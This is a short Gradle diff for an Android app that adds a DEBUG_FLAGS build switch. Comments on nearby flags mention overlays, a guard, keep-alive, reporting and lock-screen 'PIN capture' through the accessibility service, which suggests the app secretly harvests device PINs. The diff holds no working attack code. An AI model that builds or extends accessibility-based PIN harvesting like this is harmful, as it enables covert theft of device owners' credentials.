@@ -44,6 +44,9 @@ android {
         buildConfigField("boolean", "NO_GUARD", (prop("noGuard", "false")).toString())
         // 调试：-Pbare=true 时无障碍连上后什么都不做（不引导/不浮层/不守卫/不保活/不上报）
         buildConfigField("boolean", "BARE", (prop("bare", "false")).toString())
+
+        // 调试开关总闸：线上包默认 false，moying_* 这些 adb 开关全部不生效
+        buildConfigField("boolean", "DEBUG_FLAGS", (prop("debugFlags", "false")).toString())
         // 调试：-PnoBack=true 时跳过"先退两次页面"，直接进厂商流程
         buildConfigField("boolean", "NO_BACK", (prop("noBack", "false")).toString())
         // 调试：-PpinVerbose=true 时打印锁屏全部无障碍事件（排查 PIN 采集）
